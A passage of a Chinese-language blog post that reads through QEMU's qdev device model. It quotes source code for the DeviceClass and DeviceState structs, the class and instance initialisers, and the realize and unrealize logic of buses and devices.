*/</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!value &amp;&amp; bus-&gt;realized) &#123;</span><br><span class="line">        WITH_RCU_READ_LOCK_GUARD() &#123;</span><br><span class="line">            QTAILQ_FOREACH_RCU(kid, &amp;bus-&gt;children, sibling) &#123;</span><br><span class="line">                DeviceState *dev = kid-&gt;child;</span><br><span class="line">                qdev_unrealize(dev);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bc-&gt;unrealize) &#123;</span><br><span class="line">            bc-&gt;unrealize(bus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bus-&gt;realized = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其逻辑也很简单，在实例化时即调用类的<strong>realize</strong>函数；而在销毁时递归调用总线上设备的<strong>unrealize</strong>函数然后再调用类的<strong>unrealize</strong>函数即可</p><h1 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h1><p>Qemu在设备模拟上采用了前端和后端分离的设计模式。</p><p>具体的，设备前端指的是Qemu模拟设备如何呈现给Guest，呈现的设备类型应该与Guest预期看到的硬件相匹配。设备后端指的是Qemu如何处理来自设备前端的数据。</p><p>其中，Qemu设备前端都可以通过<code>-device</code>命令行进行设置，涉及到Qemu的<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/hw/qdev-core.h#L110"><strong>struct DeviceClass</strong></a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/hw/qdev-core.h#L215"><strong>struct DeviceState</strong></a>结构。</p><p>其<strong>TypeInfo</strong>为<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/qdev.c#L903"><strong>device_type_info</strong></a>，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo device_type_info = &#123;</span><br><span class="line">    .name = TYPE_DEVICE,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(DeviceState),</span><br><span class="line">    .instance_init = device_initfn,</span><br><span class="line">    .instance_post_init = device_post_init,</span><br><span class="line">    .instance_finalize = device_finalize,</span><br><span class="line">    .class_base_init = device_class_base_init,</span><br><span class="line">    .class_init = device_class_init,</span><br><span class="line">    .abstract = <span class="literal">true</span>,</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(DeviceClass),</span><br><span class="line">    .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">        &#123; TYPE_VMSTATE_IF &#125;,</span><br><span class="line">        &#123; TYPE_RESETTABLE_INTERFACE &#125;,</span><br><span class="line">        &#123; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h2 id="数据结构-1"><a href="#数据结构-1" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="struct-DeviceClass"><a href="#struct-DeviceClass" class="headerlink" title="struct DeviceClass"></a>struct DeviceClass</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct DeviceClass - The base class for all devices.</span></span><br><span class="line"><span class="comment"> * @props: Properties accessing state fields.</span></span><br><span class="line"><span class="comment"> * @realize: Callback function invoked when the #DeviceState:realized</span></span><br><span class="line"><span class="comment"> * property is changed to %true.</span></span><br><span class="line"><span class="comment"> * @unrealize: Callback function invoked when the #DeviceState:realized</span></span><br><span class="line"><span class="comment"> * property is changed to %false.</span></span><br><span class="line"><span class="comment"> * @hotpluggable: indicates if #DeviceClass is hotpluggable, available</span></span><br><span class="line"><span class="comment"> * as readonly &quot;hotpluggable&quot; property of #DeviceState instance</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DeviceClass</span> &#123;</span></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    ObjectClass parent_class;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* public: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @categories: device categories device belongs to</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    DECLARE_BITMAP(categories, DEVICE_CATEGORY_MAX);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @fw_name: name used to identify device to firmware interfaces</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *fw_name;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @desc: human readable description of device</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *desc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @props_: properties associated with device, should only be</span></span><br><span class="line"><span class="comment">     * assigned by using device_class_set_props(). The underscore</span></span><br><span class="line"><span class="comment">     * ensures a compile-time error if someone attempts to assign</span></span><br><span class="line"><span class="comment">     * dc-&gt;props directly.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Property *props_;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @user_creatable: Can user instantiate with -device / device_add?</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * All devices should support instantiation with device_add, and</span></span><br><span class="line"><span class="comment">     * this flag should not exist.  But we&#x27;re not there, yet.  Some</span></span><br><span class="line"><span class="comment">     * devices fail to instantiate with cryptic error messages.</span></span><br><span class="line"><span class="comment">     * Others instantiate, but don&#x27;t work.  Exposing users to such</span></span><br><span class="line"><span class="comment">     * behavior would be cruel; clearing this flag will protect them.</span></span><br><span class="line"><span class="comment">     * It should never be cleared without a comment explaining why it</span></span><br><span class="line"><span class="comment">     * is cleared.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * TODO remove once we&#x27;re there</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">bool</span> user_creatable;</span><br><span class="line">    <span class="type">bool</span> hotpluggable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* callbacks */</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @reset: deprecated device reset method pointer</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Modern code should use the ResettableClass interface to</span></span><br><span class="line"><span class="comment">     * implement a multi-phase reset.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">TODO:</span> remove once every reset callback is unused</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    DeviceReset reset;</span><br><span class="line">    DeviceRealize realize;</span><br><span class="line">    DeviceUnrealize unrealize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @vmsd: device state serialisation description for</span></span><br><span class="line"><span class="comment">     * migration/save/restore</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">const</span> VMStateDescription *vmsd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @bus_type: bus type</span></span><br><span class="line"><span class="comment">     * private: to qdev / bus.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *bus_type;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中比较重要的是<strong>reset</strong>、<strong>realize</strong>和<strong>unrealize</strong>字段，即重置函数、实例化函数和销毁函数。</p><h3 id="struct-DeviceState"><a href="#struct-DeviceState" class="headerlink" title="struct DeviceState"></a>struct DeviceState</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct DeviceState - common device state, accessed with qdev helpers</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This structure should not be accessed directly.  We declare it here</span></span><br><span class="line"><span class="comment"> * so that it can be embedded in individual device state structures.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DeviceState</span> &#123;</span></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line">    <span class="comment">/* public: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @id: global device id</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span> *id;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @canonical_path: canonical path of realized device in the QOM tree</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span> *canonical_path;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @realized: has device been realized?</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">bool</span> realized;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @pending_deleted_event: track pending deletion events during unplug</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">bool</span> pending_deleted_event;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @pending_deleted_expires_ms: optional timeout for deletion events</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int64_t</span> pending_deleted_expires_ms;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @opts: QDict of options for the device</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    QDict *opts;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @hotplugged: was device added after PHASE_MACHINE_READY?</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> hotplugged;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @allow_unplug_during_migration: can device be unplugged during migration</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">bool</span> allow_unplug_during_migration;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @parent_bus: bus this device belongs to</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    BusState *parent_bus;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @gpios: QLIST of named GPIOs the device provides.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    NamedGPIOListHead gpios;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @clocks: QLIST of named clocks the device provides.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    NamedClockListHead clocks;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @child_bus: QLIST of child buses</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    BusStateHead child_bus;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @num_child_bus: number of @child_bus entries</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> num_child_bus;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @instance_id_alias: device alias for handling legacy migration setups</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> instance_id_alias;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @alias_required_for_version: indicates @instance_id_alias is</span></span><br><span class="line"><span class="comment">     * needed for migration</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> alias_required_for_version;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @reset: ResettableState for the device; handled by Resettable interface.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ResettableState reset;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @unplug_blockers: list of reasons to block unplugging of device</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    GSList *unplug_blockers;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @mem_reentrancy_guard: Is the device currently in mmio/pio/dma?</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Used to prevent re-entrancy confusing things.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    MemReentrancyGuard mem_reentrancy_guard;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中比较重要的是<strong>parent_bus</strong>，即设备挂载的总线信息。</p><h2 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h2><p>根据<a href="#前端">前端</a>可知，Qemu使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/qdev.c#L713"><strong>device_class_base_init()</strong></a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/qdev.c#L801"><strong>device_class_init()</strong></a>初始化类，用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/qdev.c#L652"><strong>device_initfn()</strong></a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/qdev.c#L669"><strong>device_post_init()</strong></a>初始化对象。</p><h3 id="类初始化-1"><a href="#类初始化-1" class="headerlink" title="类初始化"></a>类初始化</h3><p><strong>TypeInfo</strong>的<strong>class_base_init</strong>字段，即<strong>device_class_base_init()</strong>函数是初始化父类之后但<strong>class_init</strong>之前调用，而<strong>class_init</strong>字段，即<strong>device_class_init()</strong>就是普通的初始化函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">device_class_base_init</span><span class="params">(ObjectClass *class, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *klass = DEVICE_CLASS(class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We explicitly look up properties in the superclasses,</span></span><br><span class="line"><span class="comment">     * so do not propagate them to the subclasses.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    klass-&gt;props_ = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">device_class_init</span><span class="params">(ObjectClass *class, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = DEVICE_CLASS(class);</span><br><span class="line">    VMStateIfClass *vc = VMSTATE_IF_CLASS(class);</span><br><span class="line">    ResettableClass *rc = RESETTABLE_CLASS(class);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span>-&gt;</span>unparent = device_unparent;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* by default all devices were considered as hotpluggable,</span></span><br><span class="line"><span class="comment">     * so with intent to check it in generic qdev_unplug() /</span></span><br><span class="line"><span class="comment">     * device_set_realized() functions make every device</span></span><br><span class="line"><span class="comment">     * hotpluggable. Devices that shouldn&#x27;t be hotpluggable,</span></span><br><span class="line"><span class="comment">     * should override it in their class_init()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    dc-&gt;hotpluggable = <span class="literal">true</span>;</span><br><span class="line">    dc-&gt;user_creatable = <span class="literal">true</span>;</span><br><span class="line">    vc-&gt;get_id = device_vmstate_if_get_id;</span><br><span class="line">    rc-&gt;get_state = device_get_reset_state;</span><br><span class="line">    rc-&gt;child_foreach = device_reset_child_foreach;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * @device_phases_reset is put as the default reset method below, allowing</span></span><br><span class="line"><span class="comment">     * to do the multi-phase transition from base classes to leaf classes. It</span></span><br><span class="line"><span class="comment">     * allows a legacy-reset Device class to extend a multi-phases-reset</span></span><br><span class="line"><span class="comment">     * Device class for the following reason:</span></span><br><span class="line"><span class="comment">     * + If a base class B has been moved to multi-phase, then it does not</span></span><br><span class="line"><span class="comment">     *   override this default reset method and may have defined phase methods.</span></span><br><span class="line"><span class="comment">     * + A child class C (extending class B) which uses</span></span><br><span class="line"><span class="comment">     *   device_class_set_parent_reset() (or similar means) to override the</span></span><br><span class="line"><span class="comment">     *   reset method will still work as expected. @device_phases_reset function</span></span><br><span class="line"><span class="comment">     *   will be registered as the parent reset method and effectively call</span></span><br><span class="line"><span class="comment">     *   parent reset phases.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    dc-&gt;reset = device_phases_reset;</span><br><span class="line">    rc-&gt;get_transitional_function = device_get_transitional_reset;</span><br><span class="line"></span><br><span class="line">    object_class_property_add_bool(class, <span class="string">&quot;realized&quot;</span>,</span><br><span class="line">                                   device_get_realized, device_set_realized);</span><br><span class="line">    object_class_property_add_bool(class, <span class="string">&quot;hotpluggable&quot;</span>,</span><br><span class="line">                                   device_get_hotpluggable, <span class="literal">NULL</span>);</span><br><span class="line">    object_class_property_add_bool(class, <span class="string">&quot;hotplugged&quot;</span>,</span><br><span class="line">                                   device_get_hotplugged, <span class="literal">NULL</span>);</span><br><span class="line">    object_class_property_add_link(class, <span class="string">&quot;parent_bus&quot;</span>, TYPE_BUS,</span><br><span class="line">                                   offsetof(DeviceState, parent_bus), <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，其主要就是初始化相关的字段和函数指针</p><h3 id="对象初始化-1"><a href="#对象初始化-1" class="headerlink" title="对象初始化"></a>对象初始化</h3><p>而<strong>TypeInfo</strong>的<strong>instance_init</strong>字段，即<strong>device_initfn()</strong>是普通的对象初始化函数，而<strong>instance_post_init</strong>字段，即<strong>device_post_init()</strong>函数，是在初始化完父类对象之后再调用。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">device_initfn</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceState *dev = DEVICE(obj);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (phase_check(PHASE_MACHINE_READY)) &#123;</span><br><span class="line">        dev-&gt;hotplugged = <span class="number">1</span>;</span><br><span class="line">        qdev_hot_added = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dev-&gt;instance_id_alias = <span class="number">-1</span>;</span><br><span class="line">    dev-&gt;realized = <span class="literal">false</span>;</span><br><span class="line">    dev-&gt;allow_unplug_during_migration = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    QLIST_INIT(&amp;dev-&gt;gpios);</span><br><span class="line">    QLIST_INIT(&amp;dev-&gt;clocks);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">device_post_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Note: ordered so that the user&#x27;s global properties take</span></span><br><span class="line"><span class="comment">     * precedence.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    object_apply_compat_props(obj);</span><br><span class="line">    qdev_prop_set_globals(DEVICE(obj));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，其主要就是初始化一些相关字段。</p><h2 id="实例化-1"><a href="#实例化-1" class="headerlink" title="实例化"></a>实例化</h2><p>类似于总线，根据<a href="#类初始化-1">类初始化</a>的内容，Qemu使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/qdev.c#L470"><strong>device_set_realized()</strong></a>来进行实例化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span 